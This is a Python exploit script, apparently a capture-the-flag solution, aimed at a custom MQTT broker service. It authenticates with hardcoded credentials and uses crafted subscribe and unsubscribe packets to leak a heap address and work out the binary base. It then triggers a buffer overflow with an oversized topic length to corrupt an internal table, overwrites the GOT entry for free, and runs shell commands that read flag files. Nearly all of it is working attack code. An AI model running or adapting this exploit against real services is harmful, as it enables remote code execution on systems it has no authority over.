import socket, struct, time, sys
HOST=sys.argv[1]; PORT=int(sys.argv[2])
TARGET=int(sys.argv[3],16)   # full 8-byte value to place in GOT[free]
CMD=(sys.argv[4] if len(sys.argv)>4 else 'id;cat /flag*;ls /').encode()
BIN2HEAP=0x220f0; TABLE=0x20338; GOT_FREE=0x20220
def varint(n):
    o=b''
    while True:
        b=n%128;n//=128
        if n:o+=bytes([b|0x80])
        else:o+=bytes([b]);break
    return o
def sstr(x):
    if isinstance(x,str): x=x.encode()
    return struct.pack('>H',len(x)&0xffff)+x
def pkt(t,b): return bytes([t])+varint(len(b))+b
s=socket.create_connection((HOST,PORT),10)
def rx(t=0.45):
    s.settimeout(t); out=b''
    try:
        while True:
            d=s.recv(65536)
            if not d: break
            out+=d
    except Exception: pass
    return out
def tx(b): s.sendall(b)
def sub(topic=None,raw=None,pl=None,t=0.5):
    body=struct.pack('>H',1)+(sstr(topic) if raw is None else struct.pack('>H',raw)+pl)
    tx(pkt(0x82,body)); time.sleep(0.12); return rx(t)
def unsub(topic,t=0.5):
    tx(pkt(0xA2,struct.pack('>H',1)+sstr(topic))); time.sleep(0.12); return rx(t)
def pub(topic,payload,t=0.6):
    tx(pkt(0x30,sstr(topic)+payload)); time.sleep(0.12); return rx(t)
body=sstr('MQTT')+bytes([4,0xC2])+struct.pack('>H',0x4321)+sstr('QWB_Client')+sstr('QWB2026_Admin')+sstr('hn5ne')
tx(pkt(0x10,body)); time.sleep(0.5); r=rx(1.0); print('[auth]',r.hex()); assert b'\x20\x02\x00\x00' in r
sub('d1zz'); sub('d2zz'); sub('d3zz'); sub(b'A'*30); sub(b'B'*30); sub('QWB2026_News')
unsub(b'A'*30); unsub(b'B'*30)
for _ in range(6): tx(b'\xc0\x00'); rx(0.25)
r=pub('QWB2026_News',b'C'*30)
i=r.find(b'\x34\x2e\x00\x0cQWB2026_News'); leak=None
if i>=0:
    bd=r[i+2:i+2+0x2e]; tl=struct.unpack('>H',bd[0:2])[0]; leak=struct.unpack('>Q',bd[2+tl+2:][:8])[0]
assert leak; BASE=leak-BIN2HEAP
CMD=CMD+b'#'*((32-len(CMD))%32 or 0)      # pad to 32 -> nb=48 -> pops fastbin[4] head (0x22120)
CMD_ADDR=BASE+0x22130
print('[base] %#x cmd@%#x len=%d'%(BASE,CMD_ADDR,len(CMD)))
print('  sub cmd:',sub(CMD).hex())
sub('/bin/sh'); sub('d1xx'); sub('d2xx'); sub('Xx'); sub('Yy'); sub('Z'*400); unsub('Yy'); unsub('Xx')
pl=bytearray(b'A'*272); pl[24:32]=struct.pack('>Q',0x21); pl[32:40]=struct.pack('>Q',(BASE+TABLE)-16)
print('  ovf1:',sub(raw=0xFFFF,pl=bytes(pl)).hex())
print('  pop1:',sub('AAAA').hex())
slot=bytearray(272)
slot[0:8]=struct.pack('>Q',CMD_ADDR)
slot[8:10]=struct.pack('>H',len(CMD))
slot[16:24]=struct.pack('>Q',BASE+GOT_FREE)     # unaligned target
slot[24:26]=struct.pack('>H',8)
print('  ovf2:',sub(raw=0xFFFF,pl=bytes(slot)).hex())
val=struct.pack('>Q',TARGET)
print('  pub3:',pub(CMD,val).hex())
tx(b'\xc0\x00'); time.sleep(0.25); print('  alive:',rx(0.5).hex())
tx(pkt(0xA2,struct.pack('>H',1)+sstr(CMD))); time.sleep(1.2)
out=rx(2.0); s.close()
print('[out]',out[:400])
